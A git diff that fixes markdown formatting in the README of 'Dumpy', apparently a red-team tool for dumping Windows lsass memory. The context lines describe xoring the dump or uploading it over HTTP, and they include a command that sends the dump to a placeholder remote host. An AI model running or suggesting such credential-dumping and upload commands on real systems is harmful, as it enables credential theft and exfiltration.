@@ -36,7 +36,7 @@ After that, simply compile the code and execute it:
 	                                       http://remotehost/upload]
 Dumpy has two main actions:
 
-- **dump**: It will execute the main logic to dump the lsass content. By default, it will store the result in a xored text file with a random name in the current directory. The option **upload** allows to send the memory content over HTTP to a remote host, avoiding the creation of the xored file on disk. I've used [this simple HTTP server](https://gist.github.com/smidgedy/1986e52bb33af829383eb858cb38775c) in order to handle the upload, but any other HTTP server that supports **multipart/form-data requests*
+- **dump**: It will execute the main logic to dump the lsass content. By default, it will store the result in a xored text file with a random name in the current directory. The option **upload** allows to send the memory content over HTTP to a remote host, avoiding the creation of the xored file on disk. I've used [this simple HTTP server](https://gist.github.com/smidgedy/1986e52bb33af829383eb858cb38775c) in order to handle the upload, but any other HTTP server that supports **multipart/form-data requests**
 * will work.
 
 		dympy.exe dump -k secretKey -u http://remotehost/upload
